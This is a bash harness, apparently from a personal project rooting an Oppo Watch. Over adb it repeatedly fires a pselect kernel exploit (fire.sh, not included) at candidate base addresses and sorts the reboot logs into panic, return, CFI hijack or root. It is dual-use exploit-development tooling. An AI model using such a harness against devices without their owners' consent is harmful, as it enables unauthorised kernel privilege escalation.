#!/usr/bin/env bash
# One-shot geometry probe.  Usage:
#   bash geo_probe.sh "<label>" "<BASES>" "<EXTRA_ENV>"
# Example:
#   bash geo_probe.sh treelLeaf "0 1 2" "GHOSTLOCK_TREE_LEAF=1"
# For each base it fires exactly one pselect (ATTEMPTS=1) with the supplied env,
# waits for reboot/recovery, and classifies the surviving breadcrumb.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
ARCH=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/captures
mkdir -p "$ARCH"
LABEL=${1:-geo}
BASES=${2:-"0 1 2"}
EXTRA=${3:-}
online() { $ADB devices 2>/dev/null | grep -q 'device$'; }
waitdev() { local m=${1:-150} w=0; while ! online; do sleep 3; w=$((w+3)); [ $w -ge $m ] && return 1; done; sleep 2; return 0; }
for b in $BASES; do
  waitdev 150 || { echo "base=$b NO-DEVICE"; continue; }
  $ADB shell "rm -f $DT/log_*.txt; sync" 2>/dev/null
  t0=$(date +%H:%M:%S)
  timeout 90 $ADB shell "$EXTRA GHOSTLOCK_WBASE=$b GHOSTLOCK_ATTEMPTS=1 sh $DT/fire.sh" >/dev/null 2>&1; rc=$?
  waitdev 150 || { echo "base=$b NO-RECOVERY"; continue; }
  $ADB shell "cat $DT/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$ARCH/${LABEL}_$b.log"
  L="$ARCH/${LABEL}_$b.log"
  verdict=PANIC
  grep -q 'pselect returned' "$L" && verdict=RETURN
  if grep -qE 'CFI post-read ret=[0-9]+ val=[0-9a-f]+ want=[0-9a-f]+' "$L"; then
    pr=$(grep -oE 'CFI post-read ret=[-0-9]+ val=[0-9a-f]+ want=[0-9a-f]+' "$L" | tail -1)
    val=$(echo "$pr" | sed -E 's/.*val=([0-9a-f]+).*/\1/'); want=$(echo "$pr" | sed -E 's/.*want=([0-9a-f]+).*/\1/')
    [ -n "$val" ] && [ "$val" = "$want" ] && verdict=HIJACK
  fi
  grep -q 'root=YES' "$L" && verdict=ROOT
  last=$(grep -o 'PRE-PCFI.*' "$L" | tail -1)
  echo "[$LABEL] base=$b rc=$rc t=$t0 verdict=$verdict  {PRE-PCFI: $last}"
  if [ "$verdict" = HIJACK ] || [ "$verdict" = ROOT ]; then echo ">>> base $b = TRUE W_BASE ($verdict) <<<"; break; fi
done
